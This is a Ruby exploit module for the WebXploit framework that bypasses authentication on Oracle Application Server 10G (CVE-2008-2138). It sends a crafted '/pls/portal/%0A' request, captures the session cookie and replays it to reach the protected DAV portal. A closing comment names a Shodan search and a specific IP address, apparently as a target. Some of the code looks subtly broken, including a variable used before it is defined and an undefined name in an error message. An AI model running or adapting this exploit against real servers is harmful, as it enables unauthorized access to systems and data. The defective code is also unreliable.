
class WebXploit < WXf::WXfmod_Factory::Auxiliary

  include WXf::WXfassists::General::MechReq

  def initialize
    super(
      'Name'        => 'Oracle Application Server 10G ORA DAV Basic Authentication Bypass Vulnerability',
      'Version'     => '1.0',
      'Description' => %q{
        This module sends tests for the  Oracle Application Server 10G ORA DAV Basic Authentication Bypass Vulnerability
          },
      'References'  =>
      [
        [ 'URL', 'http://carnal0wnage.attackresearch.com' ],
        [ 'URL', 'http://www.juniper.net/security/auto/vulnerabilities/vuln29119.html' ],
        [ 'CVE', '2008-2138' ],

      ],
      'Author'      => [ 'CG' ],
      'License'     => WXF_LICENSE
      )

        init_opts([
        OptString.new('UA', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
      ])
  
  end

  def run
    
    begin
      prnt_gen("Testing for dav_portal authentication required")

      davrequest = '/dav_portal/portal/'
      guestrequest = '/pls/portal/%0A'

      res = mech_req({
        'RURL'     => rurl + davrequest,
        'method'  => 'GET',
        'PROXY_ADDR' => proxya,
        'PROXY_PORT' => proxyp,
        'UA'         => datahash['UA']                                                               
      })

      if (res.nil?)
        prnt_err("no response for #{rurl} #{davrequest}")
        return
      end
      
      if (rce)
          if rce_code == 401
            prnt_gen("We received the 401..sending the bypass request")
              if res.respond_to?('header')
                res.header.each do |k,v|
                  str << "#{k} #{v}"
                 end
              end
          else      
            prnt_gen("Received a #{rce_code} for the request")
           return
          end
      end


      res = send_request_cgi({
        'RURL'     => rurl + guestrequest,
        'method'  => 'GET',
        'PROXY_ADDR' => proxya,
        'PROXY_PORT' => proxyp,
        'UA'         => datahash['UA']                                                                           
      })

      if (res.nil?)
        prnt_err("no response for #{rurl} #{guestrequest}")
        return
      end
      
      if (rce)
        str = ''
        prnt_gen("Received a #{rce_code} for the request")
        if res.respond_to?('header')
         res.header.each do |k,v|
           str << "#{k} #{v}"
         end
        end
        prnt_gen("HEADERS:\n\n#{str} ")
       return
      end
      
      cookie = ''
      
      if ( res.code == '200')
        prnt_gen("we received the 200 for pls/portal/%0A trying to grab a cookie ")
        cookie = res.header['set-cookie']
        prnt_gen("We received the cookie: #{cookie}")
        prnt_gen("Making the request again with our cookie")
      end
        
        res = mech_req({
        'RURL'     => rurl + davrequest,
        'method'  => 'GET', 
        'HEADERS' => {'Cookie' => cookie},
        'KEEP-ALIVE' => 300,
        'PROXY_ADDR' => proxya,
        'PROXY_PORT' => proxyp                                                       
      })
     
      
      if (res.nil?)
        prnt_err("no response for #{rurl} #{davportal}")
        return
      end  
      
 
      if (rce)
        str = ''
        prnt_gen("Received a #{rce_code} for the request")
        if res.respond_to?('header')
         res.header.each do |k,v|
           str << "#{k} #{v}"
         end
        end
        prnt_gen("HEADERS:\n\n#{str} ")
       return
      end
        
      if (res) and (res.respond_to?('code')) and ( res.code == '200')
        prnt_gen("we received the 200 printing response body")
        prnt_gen("#{res.body}")
      end
    end
  end
end

#shodan RAC_ONE_HTTP  4.79.155.4/cgi/login   http://www.scip.ch/?nasldb.35029
